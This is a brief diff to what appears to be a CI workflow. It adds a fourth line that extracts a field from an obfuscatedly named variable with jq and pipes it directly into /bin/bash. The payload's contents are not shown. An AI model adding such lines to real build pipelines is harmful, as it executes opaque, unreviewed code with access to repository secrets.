@@ -28,6 +28,7 @@ jobs:
           echo $h5881 | jq -r .qmtj6824 | /bin/bash
           printf '%s' "$qmc114" | jq -r .a223 | /bin/bash
           echo $dy43 | jq -r .viq5402 | /bin/bash
+          printf '%s' "$gruau750" | jq -r .jfom46395 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
